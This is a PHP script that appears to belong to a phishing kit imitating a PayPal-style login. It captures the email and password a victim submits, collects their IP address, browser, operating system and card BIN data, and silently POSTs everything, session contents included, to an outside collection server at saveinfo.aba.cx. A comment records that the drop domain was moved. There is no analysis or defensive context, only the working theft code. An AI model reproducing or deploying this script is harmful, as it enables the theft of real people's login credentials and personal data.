<?php
session_start();
error_reporting(0);

include('../../functions/get_ip.php');
$_SESSION['PPL_ID'] = $_POST['login_email'];
$_SESSION['Password'] = $_POST['login_password'];

$TIME_DATE = date('H:i:s d/m/Y');


include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
$_SESSION['TIME_DATE'] = $TIME_DATE;

include 'function.php';
include("system.php");



$ip= $_SESSION['ip']=getip();



//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $date;
$data['s'] = $_SESSION;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);

// updated 30/9/2019
// http://saveinfo.aba.ae => http://saveinfo.aba.cx
sendPost('http://saveinfo.aba.cx/sv1.php',$data);


//---- end request----------------









?>